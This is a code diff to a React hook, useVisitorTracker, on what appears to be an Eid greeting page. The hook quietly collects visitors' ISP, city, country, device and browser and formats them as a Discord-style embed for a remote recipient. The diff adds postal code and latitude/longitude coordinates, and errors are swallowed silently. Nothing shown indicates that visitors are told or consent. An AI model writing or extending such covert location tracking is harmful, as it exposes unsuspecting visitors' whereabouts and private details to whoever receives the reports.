@@ -5,6 +5,9 @@ interface VisitorInfo {
   city: string;
   country_name: string;
   org: string;
+  postal: string;
+  latitude: number;
+  longitude: number;
 }
 
 function parseUserAgent() {
@@ -27,6 +30,8 @@ function parseUserAgent() {
   let device = 'Desktop';
   if (/Mobile|Android|iPhone|iPad/.test(ua)) device = 'Mobile';
   else if (/Tablet/.test(ua)) device = 'Tablet';
+
+  
 
   return { os, browser, device };
 }
@@ -63,15 +68,14 @@ export function useVisitorTracker() {
                   inline: true,
                 },
                 { name: '🏢 ISP', value: data.org || 'Unknown', inline: true },
+                { name: '📮 Postal', value: data.postal || 'Unknown', inline: true },
+                { name: '🗺️ Coordinates', value: `${data.latitude || '?'}, ${data.longitude || '?'}`, inline: true },
                 { name: '💻 Device', value: device, inline: true },
                 { name: '🖥️ OS', value: os, inline: true },
                 { name: '🌍 Browser', value: browser, inline: true },
                 { name: '🕐 Visited At', value: visitedAt, inline: false },
               ],
               footer: { text: 'Eid Mubarak 1447 H — Team AAA' },
-              thumbnail: {
-                url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/Star_and_Crescent.svg/240px-Star_and_Crescent.svg.png',
-              },
             },
           ],
         };
@@ -86,7 +90,7 @@ export function useVisitorTracker() {
         sessionStorage.setItem(SESSION_KEY, '1');
       })
       .catch(() => {
-        // silently fail — don't disrupt user experience
+
       });
   }, []);
 }
